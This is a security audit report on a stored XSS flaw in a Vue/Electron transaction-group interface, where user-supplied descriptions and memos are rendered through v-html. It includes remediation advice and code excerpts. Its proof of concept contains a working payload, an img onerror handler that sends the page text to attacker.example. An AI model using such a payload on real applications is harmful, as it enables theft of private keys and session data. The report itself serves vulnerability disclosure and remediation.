Audit Report

## Title
Stored XSS via Unsanitized User-Controlled Data Rendered with `v-html` in Transaction Group UI

## Summary
`CreateTransactionGroup.vue` passes user-supplied `groupItem.description` and `transactionMemo` directly to Vue's `v-html` directive without any HTML sanitization. In Organization Mode, these values are persisted to the backend and loaded by other org members, creating a stored XSS vector that executes in the Electron renderer process.

## Finding Description

The `v-html` binding at lines 421–429 of `CreateTransactionGroup.vue` renders one of three expressions as raw HTML: [1](#0-0) 

The three branches are:
1. `makeTransfer(index)` — calls `formatHbarTransfers`, which returns hardcoded strings or structured Hedera account IDs (e.g., `0.0.12345`). Not user-injectable.
2. `groupItem.description` — a free-text field entered by any org member. **Directly injectable.**
3. `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` — the transaction memo embedded in serialized bytes, also user-supplied. **Directly injectable.**

The fallback `createTransactionId(groupItem.payerAccountId, groupItem.validStart)` uses structured SDK types and is not injectable.

`formatHbarTransfers` is confirmed to return only hardcoded strings or structured account IDs: [2](#0-1) 

Groups and their items are loaded from the backend on mount via `handleLoadGroup()`: [3](#0-2) [4](#0-3) 

By contrast, the backend email templates correctly apply `escapeHtml()` to all user-supplied strings before HTML interpolation: [5](#0-4) 

No equivalent sanitization exists on the frontend `v-html` path.

## Impact Explanation

The Electron `BrowserWindow` is configured with `contextIsolation: true` and `nodeIntegration: false`, which prevents direct Node.js API access from the renderer: [6](#0-5) 

However, `sandbox: false` means the renderer process is **not** OS-sandboxed. Even within the `contextIsolation: true` boundary, a successful XSS payload can:
- Exfiltrate all data visible in the renderer DOM (private keys displayed in the UI, account IDs, transaction data, session tokens).
- Manipulate the DOM to deceive the victim into confirming or signing malicious transactions.
- Abuse any IPC channels exposed by the preload script to the renderer, potentially escalating to main-process operations.

The `sandbox: false` setting means the renderer process retains OS-level capabilities beyond what a sandboxed process would have, increasing the blast radius of any successful exploit.

## Likelihood Explanation

Any authenticated organization member — no admin privilege required — can create a transaction with an arbitrary `description` or `transactionMemo`. The attack triggers automatically when any other org member opens the Create Transaction Group page while the malicious group is loaded. No physical access, leaked credentials, or user interaction beyond normal app usage is required.

## Recommendation

Replace `v-html` with Vue's standard text interpolation (`{{ }}`) for all three display branches. `v-html` is unnecessary here — the values are plain text labels, not intentional HTML markup. Specifically:

- Replace the `v-html` binding on the `<div>` at line 419 with a computed property or inline ternary using `{{ }}` text interpolation.
- If `v-html` must be retained anywhere for legitimate HTML rendering, apply a well-tested sanitization library (e.g., `DOMPurify`) before binding.
- Consider enabling `sandbox: true` in `webPreferences` to add OS-level process isolation to the renderer.

## Proof of Concept

1. Attacker (any org member) creates a transaction with `description` set to:
   ```
   <img src=x onerror="fetch('https://attacker.example/?d='+btoa(document.body.innerText))">
   ```
2. The transaction is added to a group and saved to the org backend.
3. A victim org member opens the Create Transaction Group page. `handleLoadGroup()` fetches the group from the backend.
4. The malicious `description` is bound to `v-html` at line 425 and injected into the DOM as raw HTML.
5. The `onerror` handler fires in the Electron renderer process, exfiltrating all visible page text (which may include private keys, account IDs, and transaction data) to the attacker's server.

export function formatHbarTransfers(transfers: Transfer[]): string {
  if (transfers.length === 0) {
    return 'No transfers';
  }

  if (transfers.length === 1) {
    const amount = transfers[0].amount;
    if (amount.isNegative()) {
      return 'Missing receiver';
    } else {
      return 'Missing sender';
    }
  }

  if (transfers.length === 2) {
    // the JS SDK sorts the order of the transfers by account ID. We don't want this. We want the sender to be on the
    // left and the receiver to be on the right. So we need to check if the amount is negative or positive and then
    // arrange the transfers accordingly
    let sender = transfers[0];
    let receiver = transfers[1];
    if (receiver.amount.isNegative()) {
      sender = transfers[1];
      receiver = transfers[0];
    }
    return `${sender.accountId} --> ${stringifyHbarWithFont(receiver.amount)} --> ${receiver.accountId}`;
  }

  return 'Multiple transfers';
```

export function escapeHtml(str: string | null | undefined): string {
  if (str == null) {
    return "";
  }

  const value = String(str);

  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```
